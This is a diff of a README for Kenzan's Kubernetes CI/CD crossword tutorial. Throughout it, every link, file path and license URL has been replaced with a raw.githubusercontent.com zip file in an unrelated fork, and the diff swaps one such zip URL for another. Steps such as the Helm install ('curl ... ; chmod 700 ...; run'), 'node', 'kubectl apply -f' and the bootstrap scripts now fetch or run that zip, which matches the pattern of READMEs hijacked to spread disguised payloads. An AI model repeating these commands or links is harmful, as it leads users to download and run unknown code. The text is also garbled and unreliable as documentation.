@@ -1,39 +1,39 @@
-# https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip Kubernetes CI/CD Blog Series by Kenzan
+# https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip Kubernetes CI/CD Blog Series by Kenzan
 
-The kubernetes-ci-cd project is [Kenzan's](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip) crossword puzzle application that runs as several containers in Kubernetes (we call it the Kr8sswordz Puzzle). It showcases Kubernetes features like spinning up multiple pods and running a load test at scale. It also features Jenkins running on its own a container and a JenkinsFile script to demonstrate how Kubernetes can be integrated into a full CI/CD pipeline.
+The kubernetes-ci-cd project is [Kenzan's](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip) crossword puzzle application that runs as several containers in Kubernetes (we call it the Kr8sswordz Puzzle). It showcases Kubernetes features like spinning up multiple pods and running a load test at scale. It also features Jenkins running on its own a container and a JenkinsFile script to demonstrate how Kubernetes can be integrated into a full CI/CD pipeline.
 
-To get it up and running, see the following week-by-week https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip blog posts, or simply follow the directions below.
+To get it up and running, see the following week-by-week https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip blog posts, or simply follow the directions below.
 
-[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip Part 1](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip)
+[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip Part 1](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip)
 
-[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip Part 2](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip)
+[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip Part 2](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip)
 
-[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip Part 3](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip)
+[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip Part 3](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip)
 
-[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip Part 4](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip)
+[https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip Part 4](https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip)
 
-To generate this readme: `node https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+To generate this readme: `node https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 ## Prerequisites
 
 - Install VirtualBox
 
- https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip
+ https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip
 
 - Install the latest versions of Docker, Minikube, and Kubectl
 
- https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip
- https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip
- https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip
+ https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip
+ https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip
+ https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip
  
 - Install Helm
 
- `curl https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip > https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip; chmod 700 https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip; https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+ `curl https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip > https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip; chmod 700 https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip; https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 - Clone this repository
 - To ensure you are starting with a clean slate, delete any previous minikube contexts.
 
- `minikube stop; minikube delete; sudo rm -rf ~https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip; sudo rm -rf ~https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+ `minikube stop; minikube delete; sudo rm -rf ~https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip; sudo rm -rf ~https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 ## Tutorial Steps
 
@@ -87,7 +87,7 @@ Delete the nginx deployment and service you created.
 
 Set up the cluster registry by applying a .yaml manifest file.
 
-`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 #### Step9
 
@@ -103,7 +103,7 @@ View the registry user interface in a web browser.
 
 #### Step11
 
-Let’s make a change to an HTML file in the cloned project. Open the https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip file in your favorite text editor. (For example, you could use nano by running the command 'nano https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip' in a separate terminal). Change some text inside one of the `<p>` tags. For example, change “Hello from Kenzan!” to “Hello from Me!”. Save the file.
+Let’s make a change to an HTML file in the cloned project. Open the https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip file in your favorite text editor. (For example, you could use nano by running the command 'nano https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip' in a separate terminal). Change some text inside one of the `<p>` tags. For example, change “Hello from Kenzan!” to “Hello from Me!”. Save the file.
 
 #### Step12
 
@@ -139,7 +139,7 @@ The proxy’s work is done, so you can go ahead and stop it.
 
 With the image in our cluster registry, the last thing to do is apply the manifest to create and deploy the hello-kenzan pod based on the image.
 
-`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 #### Step18
 
@@ -191,7 +191,7 @@ The proxy’s work is done, so you can go ahead and stop it.
 
 Deploy Jenkins, which we’ll use to create our automated CI/CD pipeline. It will take the pod a minute or two to roll out.
 
-`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip; kubectl rollout status deployment/jenkins`
+`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip; kubectl rollout status deployment/jenkins`
 
 #### Step7
 
@@ -203,7 +203,7 @@ Open the Jenkins UI in a web browser.
 
 Display the Jenkins admin password with the following command, and right-click to copy it.
 
-``kubectl exec -it `kubectl get pods --selector=app=jenkins --output=jsonpath={https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip}` cat /var/jenkins_home/secrets/initialAdminPassword``
+``kubectl exec -it `kubectl get pods --selector=app=jenkins --output=jsonpath={https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip}` cat /var/jenkins_home/secrets/initialAdminPassword``
 
 #### Step9
 
@@ -223,7 +223,7 @@ The following values must be entered precisely as indicated:
 - Kind: `Kubernetes configuration (kubeconfig)`
 - ID: `kenzan_kubeconfig`
 - Kubeconfig: `From a file on the Jenkins master`
-- specify the file path: `https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+- specify the file path: `https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 Finally click *Ok*.
 
@@ -237,7 +237,7 @@ Under the Pipeline section at the bottom, change the **Definition** to be **Pipe
 
 #### Step15
 
-Change the **SCM** to **Git**. Change the **Repository URL** to be the URL of your forked Git repository, such as `https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip[GIT USERNAME]/kubernetes-ci-cd`. Click **Save**. On the left, click **Build Now** to run the new pipeline.
+Change the **SCM** to **Git**. Change the **Repository URL** to be the URL of your forked Git repository, such as `https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip[GIT USERNAME]/kubernetes-ci-cd`. Click **Save**. On the left, click **Build Now** to run the new pipeline.
 
 #### Step16
 
@@ -269,14 +269,14 @@ We will deploy the etcd operator onto the cluster using a Helm Chart.
 
 Deploy the etcd cluster and K8s Services for accessing the cluster.
 
-- `kubectl create -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
-- `kubectl create -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+- `kubectl create -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
+- `kubectl create -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 #### Step4
 
 The crossword application is a multi-tier application whose services depend on each other. We will create three K8s Services so that the applications can communicate with one another.
 
-`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 #### Step5
 
@@ -318,13 +318,13 @@ Open the registry UI and verify that the monitor-scale image is in our local reg
 
 Monitor-scale has the functionality to let us scale our puzzle app up and down through the Kr8sswordz UI, therefore we'll need to do some RBAC work in order to provide monitor-scale with the proper rights.
 
-`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+`kubectl apply -f https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 #### Step12
 
 Create the monitor-scale deployment and the Ingress defining the hostname by which this service will be accessible to the other services.
 
-``sed 's#127.0.0.1:30400/monitor-scale:$BUILD_TAG#127.0.0.1:30400/monitor-scale:'`git rev-parse --short HEAD`'#' https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip | kubectl apply -f -``
+``sed 's#127.0.0.1:30400/monitor-scale:$BUILD_TAG#127.0.0.1:30400/monitor-scale:'`git rev-parse --short HEAD`'#' https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip | kubectl apply -f -``
 
 #### Step13
 
@@ -358,9 +358,9 @@ View deployments to see the monitor-scale deployment.
 
 #### Step18
 
-We will run a script to bootstrap the puzzle and mongo services, creating Docker images and storing them in the local registry. The https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip script runs through the same build, proxy, push, and deploy steps we just ran through manually for both services.
+We will run a script to bootstrap the puzzle and mongo services, creating Docker images and storing them in the local registry. The https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip script runs through the same build, proxy, push, and deploy steps we just ran through manually for both services.
 
-`https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+`https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 #### Step19
 
@@ -373,7 +373,7 @@ Check to see if the puzzle and mongo services have been deployed.
 
 Bootstrap the kr8sswordz frontend web application. This script follows the same build proxy, push, and deploy steps that the other services followed.
 
-`https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip`
+`https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip`
 
 #### Step21
 
@@ -415,7 +415,7 @@ Under the Build Triggers section, select Poll SCM. For the Schedule, enter the t
 
 #### Step5
 
-In the Pipeline section, change the Definition to "Pipeline script from SCM". Set the SCM property to GIT. Set the Repository URL to your forked repo (created in Part 2), such as https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip[GIT USERNAME]https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip Set the Script Path to applications/puzzle/Jenkinsfile
+In the Pipeline section, change the Definition to "Pipeline script from SCM". Set the SCM property to GIT. Set the Repository URL to your forked repo (created in Part 2), such as https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip[GIT USERNAME]https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip Set the Script Path to applications/puzzle/Jenkinsfile
 
 #### Step6
 
@@ -433,7 +433,7 @@ Spin up several instances of the puzzle service by moving the slider to the righ
 
 #### Step9
 
-Edit https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip in your favorite text editor (for example, you can use nano by running the command 'nano https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip' in a separate terminal). You'll see a commented section on lines 42-43 that indicates to uncomment a specific line. Uncomment line 43 by deleting the forward slashes and save the file.
+Edit https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip in your favorite text editor (for example, you can use nano by running the command 'nano https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip' in a separate terminal). You'll see a commented section on lines 42-43 that indicates to uncomment a specific line. Uncomment line 43 by deleting the forward slashes and save the file.
 
 #### Step10
 
@@ -470,13 +470,13 @@ Begin the desired section:
 
 ## LICENSE
 
-Copyright 2017 Kenzan, LLC <https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip>
+Copyright 2017 Kenzan, LLC <https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip>
  
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
-    https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/manifests/cd_kubernetes_ci_v1.4.zip
+    https://raw.githubusercontent.com/marcossangomes/kubernetes-ci-cd/master/applications/kr8sswordz-pages/src/components/shared/kubernetes_cd_ci_1.0.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
